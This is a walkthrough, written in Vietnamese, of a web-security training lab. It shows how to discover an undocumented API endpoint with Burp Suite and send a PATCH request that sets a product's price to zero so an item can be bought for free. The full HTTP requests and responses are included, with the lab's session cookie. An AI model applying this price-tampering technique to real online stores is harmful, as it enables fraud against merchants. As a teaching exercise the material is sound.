# **Lab: Finding and exploiting an unused API endpoint**

>  To solve the lab, exploit a hidden API endpoint to buy a `Lightweight l33t Leather Jacket`. You can log in to your own account using the following credentials: `wiener:peter`.  

# **Solution**

Ở giao diện web, chọn `View details` sản phẩm mục tiêu là `Lightweight l33t Leather Jacket.  

Trong giao diện `HTTP history` của Burpsuite, ta thấy có request vừa bắt được với method GET tới URL `/api/products/1/price`. Gửi request này tới repeater. Ta thử thay đổi giá trị product id từ 1 sang các giá trị khác.

Ta nhận được giá các sản phẩm khác. Giờ thử thay đổi HTTP method của req này từ GET tới các phương thức khác:

```
POST /api/products/1/price HTTP/2
```

```
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

Ta thấy api chỉ chấp nhận method GET và PATCH, thử dùng phương thức PATCH:

```
HTTP/2 401 Unauthorized
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"Unauthorized"
```

Ta thấy lỗi `Unauthorized`. Vậy là cần đăng nhập trước.

Đăng nhập bằng tài khoản `wiener:peter` và thực hiện lại.

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 93

{"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}
```

Ta thấy thông báo lỗi `"Only 'application/json' Content-Type is supported"`. Vậy là chỉ có Content-Type application/json được hỗ trợ.  
Sửa đổi HTTP request phần `Content-Type` sang `application/json`.

Vì HTTP request hiện tại chưa có mục này nên ta sẽ thêm header `Content-Type` và set value là `application/json`.

```
PATCH /api/products/1/price HTTP/2
Host: 0a1b00b304ffd9ef801f301000e600dc.web-security-academy.net
Cookie: session=HrykKiVMqCPdE26x5FDpZuUoNe4DkiWa
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1b00b304ffd9ef801f301000e600dc.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
```

Sau khi send request, ta thấy lỗi `Internal Server Error`.

Mục đích ta đang thực hiện là thay đổi giá trị price của sản phẩm bằng phương thức PATCH.

> "PATCH is somewhat analogous to the "update" concept found in CRUD (in general, HTTP is different than CRUD, and the two should not be confused)."

Và ta có:

```
PATCH /file.txt HTTP/1.1
Host: www.example.com
Content-Type: application/example
If-Match: "e0023aa4e"
Content-Length: 100

[description of changes]
```

Vậy nên giờ ta sửa đổi HTTP request của mình, thêm phần price trong request.

```
PATCH /api/products/1/price HTTP/2
Host: 0a1b00b304ffd9ef801f301000e600dc.web-security-academy.net
Cookie: session=HrykKiVMqCPdE26x5FDpZuUoNe4DkiWa
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1b00b304ffd9ef801f301000e600dc.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Content-Length: 21

{
	"price": 0
}

```

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.00"}
```

Okey done, sau khi tải lại trang thì ta thấy giá sản phẩm bây giờ là 0.

Giờ thì `Add to cart` và thanh toán thuii:>

![image](https://ih1.redbubble.net/image.3205821918.1712/flat,750x,075,f-pad,750x1000,f8f8f8.jpg)